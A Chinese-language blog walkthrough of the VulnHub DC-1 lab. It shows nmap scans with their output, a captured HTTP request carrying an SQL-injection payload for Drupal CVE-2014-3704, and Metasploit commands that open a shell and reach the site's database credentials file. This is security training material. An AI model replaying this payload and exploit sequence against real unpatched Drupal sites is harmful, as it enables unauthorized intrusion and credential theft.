<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="主机发现、目标信息扫描、漏洞扫描、网站指纹信息识别、网站目录扫描、drupal CMS 漏洞利用（CVE 2014-3704）、Metasploit 渗透、获取可交互式 shell、进一步搜集信息、查看用户 sudo 权限、查找具有 Setuid 权限位的可执行文件、提权。">
<meta property="og:type" content="article">
<meta property="og:title" content="《VulnHub》DC：1">
<meta property="og:url" content="https://blog.lens-shrine.top/2024/01/01/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/index.html">
<meta property="og:site_name" content="镜坛">
<meta property="og:description" content="主机发现、目标信息扫描、漏洞扫描、网站指纹信息识别、网站目录扫描、drupal CMS 漏洞利用（CVE 2014-3704）、Metasploit 渗透、获取可交互式 shell、进一步搜集信息、查看用户 sudo 权限、查找具有 Setuid 权限位的可执行文件、提权。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7de52147067b4e3fba05f10e77c91529.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/619ea755a7954eeeb933b9b02a0d356e.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/85e3d6f2d6004803a093775ad015b2a0.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/ba59bee5b8f0436e9c7c16526240cc0b.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7c24a082ed754937927c24e63248b3c3.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/e1ac059379f5488199ff085d948fa965.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/d382509d35c1419c8e934d316d9f2ef3.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/ffea9bb71a9c455cb57267f60e5dc0b2.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/49ffef78d3fb458dbf13d413704f2abd.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/0474d201250f42a9a72ec0c4e05bff87.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/51761891247b43869ab87a7c8af1501c.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/24acd0e5f5d14619b3c8840c5378e20f.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/5cd6bfb96ff24972ba57671ffac03d35.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/56fd787dfb41463e8c7ed5f3d185e08f.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/57cb2a7465d64ffba93d8cc0cc22acaa.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/00c41a0d5d9b478990891146014e933a.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/29e0fb2f4292428d934125233ee6763e.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/3b7268fc7f7b4326b56d1ca34b5292d4.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/92aa1cb858764bc295b79a5e05a87fef.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7a7ebe2b14c247a2ba57dd791af03dc2.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/4eb877594d2640f080a07a002b7fc027.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/0d0b56652ef24f88b5604da159a216c2.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/e01e758b76ad472ba5ed2b4c1adad3c4.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/133e04cc2a564235a4fef12bc5a1181f.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/3fa6af10ebcd4a44b9ce0fad505f34e9.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/1917d98c65f74a7dbd0821d0de5d3392.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/8d7770e77fab4c248fd4307979592fb3.png">
<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/4c90e35fb14e48c2a03d05ce1253bebc.png">
<meta property="article:published_time" content="2024-01-01T04:46:49.000Z">
<meta property="article:modified_time" content="2024-01-01T04:46:50.000Z">
<meta property="article:author" content="镜坛主">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7de52147067b4e3fba05f10e77c91529.png"><title>《VulnHub》DC：1 | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2024/01/01/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":true},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《VulnHub》DC：1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2024-01-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-01-01</span></span></div></header><div class="post-body"><p>@<a href="VulnHub">TOC</a></p>
<hr>
<blockquote>
<p>VulnHub 打靶记录。<br>VulnHub 官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/" >https://www.vulnhub.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<blockquote>
<p>攻击机为 Kali-Linux-2023.3-vmware-amd64。<br>Kali NAT IP：192.168.8.15。</p>
</blockquote>

        <h1 id="1：靶场信息"   >
          <a href="#1：靶场信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：靶场信息" class="headerlink" title="1：靶场信息"></a>1：靶场信息</h1>
      <p>靶场网址：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/" >https://www.vulnhub.com/entry/dc-1,292/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="2：打靶"   >
          <a href="#2：打靶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2：打靶" class="headerlink" title="2：打靶"></a>2：打靶</h1>
      
        <h2 id="2-1：情报收集-威胁建模"   >
          <a href="#2-1：情报收集-威胁建模" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1：情报收集-威胁建模" class="headerlink" title="2.1：情报收集 &amp; 威胁建模"></a>2.1：情报收集 &amp; 威胁建模</h2>
      <p><strong>主机发现</strong>：<br><code>nmap -sn 192.168.8.0/24</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7de52147067b4e3fba05f10e77c91529.png" alt="在这里插入图片描述"></p>
<p>确定目标 IP 为 192.168.8.132。</p>
<p><strong>进行端口扫描、服务探测、操作系统探测</strong>：<br><code>nmap -p- -sV -sC -O 192.168.8.132</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/619ea755a7954eeeb933b9b02a0d356e.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.8.132</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          35249/tcp   status</span><br><span class="line">|   100024  1          42703/udp6  status</span><br><span class="line">|   100024  1          43760/udp   status</span><br><span class="line">|_  100024  1          45642/tcp6  status</span><br><span class="line">35249/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:58:12:58 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds</span><br></pre></td></tr></table></div></figure>

<p><strong>用 nmap 的漏洞库对端口进行扫描</strong>：<br><code>nmap --script=vuln -p 22,80,111,35249 192.168.8.132</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/85e3d6f2d6004803a093775ad015b2a0.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.8.132</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.8.132</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/password</span><br><span class="line">|     Form id: user-pass</span><br><span class="line">|     Form action: /user/password</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/node?destination=node</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/register</span><br><span class="line">|     Form id: user-register-form</span><br><span class="line">|     Form action: /user/register</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|     Form action: /user/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|_    Form action: /user</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2014-3704: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Drupal - pre Auth SQL Injection Vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-3704</span><br><span class="line">|         The expandArguments function in the database abstraction API in</span><br><span class="line">|         Drupal core 7.x before 7.32 does not properly construct prepared</span><br><span class="line">|         statements, which allows remote attackers to conduct SQL injection</span><br><span class="line">|         attacks via an array containing crafted keys.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2014-10-15</span><br><span class="line">|     References:</span><br><span class="line">|       http://www.securityfocus.com/bid/70595</span><br><span class="line">|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704</span><br><span class="line">|_      https://www.drupal.org/SA-CORE-2014-005</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /rss.xml: RSS or Atom feed</span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README: Interesting, a readme.</span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /0/: Potentially interesting folder</span><br><span class="line">|_  /user/: Potentially interesting folder</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">35249/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:58:12:58 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 148.71 seconds</span><br></pre></td></tr></table></div></figure>

<p>可以发现 80 端口的 HTTP 服务漏洞有：CSRF、CVE 2014-3704。</p>
<p>web 页面如下：</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/ba59bee5b8f0436e9c7c16526240cc0b.png" alt="在这里插入图片描述"></p>
<p>该网站能注册新用户但密码未知。</p>
<p>既然有 HTTP 服务，那就扫描一下网站。</p>
<p><strong>扫描网站根目录指纹信息</strong>：<br><code>whatweb http://192.168.8.132/</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7c24a082ed754937927c24e63248b3c3.png" alt="在这里插入图片描述"></p>
<p><strong>扫描网站目录</strong>：<br><code>dirsearch -u http://192.168.8.132/</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/e1ac059379f5488199ff085d948fa965.png" alt="在这里插入图片描述"></p>
<p>没有发现比较有趣的目录。</p>
<p>那就尝试使用 CVE 2014-3704 漏洞作为切入点吧。</p>

        <h2 id="2-2：漏洞分析-渗透攻击"   >
          <a href="#2-2：漏洞分析-渗透攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2：漏洞分析-渗透攻击" class="headerlink" title="2.2：漏洞分析 &amp; 渗透攻击"></a>2.2：漏洞分析 &amp; 渗透攻击</h2>
      <p>通过搜索引擎寻找 CVE 2014-3704 漏洞利用方法。</p>
<blockquote>
<p>《Vulhub之“Drupalgeddon” SQL注入漏洞（CVE-2014-3704）》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104620273" >https://blog.csdn.net/angry_program&#x2F;article&#x2F;details&#x2F;104620273</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>登录点抓包，添加 payload</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/d382509d35c1419c8e934d316d9f2ef3.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=node&amp;destination=node HTTP/1.1</span><br><span class="line">Host: 192.168.8.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Origin: http://192.168.8.132</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.8.132/</span><br><span class="line">Cookie: has_js=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name[0 or updatexml(0,concat(0x7e,database(),0x7e),0)%23]=bob&amp;name[0]=a&amp;pass=bug&amp;form_build_id=form-hUM-lGJvIc5NEmlo46nu_0Z7cOfyfmk6BQjvIRD4goA&amp;form_id=user_login_block&amp;op=Log in</span><br></pre></td></tr></table></div></figure>

<p>爆出数据库。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/ffea9bb71a9c455cb57267f60e5dc0b2.png" alt="在这里插入图片描述"></p>
<p>将刚才的数据包保存，丢给 SQLmap。</p>
<p><strong>sqlmap 探测</strong>：<br><code>sqlmap -r /root/Desktop/sql.txt --batch</code></p>
<p>不过 sqlmap 并没有跑出结果。</p>
<p>那就使用 metasploit 查找相关利用方法。</p>
<p><strong>启动 msf</strong>：<br><code>msfdb init &amp;&amp; msfconsole</code></p>
<p><strong>查找 CVE 2014-3704 漏洞相关利用模块</strong>：<br><code>search 2014-3704</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/49ffef78d3fb458dbf13d413704f2abd.png" alt="在这里插入图片描述"></p>
<p>只有一个，那就尝试使用一下。</p>
<p><strong>使用模块</strong>：<br><code>use 0</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/0474d201250f42a9a72ec0c4e05bff87.png" alt="在这里插入图片描述"></p>
<p><strong>查看参数</strong>：</p>
<p><code>show options</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/51761891247b43869ab87a7c8af1501c.png" alt="在这里插入图片描述"></p>
<p><strong>配置参数</strong>：<br><code>set rhosts 192.168.8.132</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/24acd0e5f5d14619b3c8840c5378e20f.png" alt="在这里插入图片描述"></p>
<p><strong>利用，获取会话</strong>：<br><code>run</code></p>
<p><strong>获取目标 shell</strong>：<br><code>shell</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/5cd6bfb96ff24972ba57671ffac03d35.png" alt="在这里插入图片描述"></p>
<p>查看当前目录，可以看到一个 flag 文件。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/56fd787dfb41463e8c7ed5f3d185e08f.png" alt="在这里插入图片描述"></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/57cb2a7465d64ffba93d8cc0cc22acaa.png" alt="在这里插入图片描述"></p>
<p>提示查看 CMS 的配置文件。drupal CMS 的配置文件在 <font style="background:#70AD47">.&#x2F;sites&#x2F;default&#x2F;</font> 目录下。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/00c41a0d5d9b478990891146014e933a.png" alt="在这里插入图片描述"></p>
<p>在 <font style="background:#70AD47">settings.php</font> 文件中找到以下关键信息（flag2 与 mysql 数据库认证信息）：</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/29e0fb2f4292428d934125233ee6763e.png" alt="在这里插入图片描述"></p>
